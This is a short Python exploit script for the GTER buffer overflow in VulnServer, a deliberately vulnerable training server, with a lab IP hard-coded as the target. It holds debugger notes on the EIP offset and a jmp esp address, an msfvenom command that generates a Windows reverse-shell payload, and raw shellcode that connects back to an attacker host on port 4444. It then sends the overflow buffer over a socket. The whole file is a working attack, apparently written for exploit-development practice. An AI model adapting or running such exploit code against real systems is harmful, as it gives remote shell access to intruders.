#!/usr/bin/python

import sys, socket
target = '192.168.56.101'
port = 9999
'''


credit to https://www.absolomb.com/2018-07-24-VulnServer-GTER/

Log data, item 17
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x386f4337 (offset 2003)

0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\test\Desktop\essfunc.dll)

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -e x86/alpha_mixed -f python -b "\x00\x0a\x0d"
'''
buf = "\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x2a\xc8\xac\x41\x31\xc0\xff\xd3\x96\x68\xc0\xa8\x38\x66\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xbb\xdd\x6b\xac\x41\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xbb\x82\x20\xde\x77\xff\xd3\x31\xc0\xb8\x12\xbd\xe3\x77\x31\xc9\x51\xff\xd0"
jmp_eax = "\x83\xc0\x08\xff\xe0"
adjust = "\x50\x5c"
buff=  adjust +  buf + ("\x90" * (147 - len(buf) - len(adjust))) + "\x05\x12\x50\x62"
buff +=  jmp_eax
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((target,port))
s.send('GTER /.:/' + buff)
s.close()
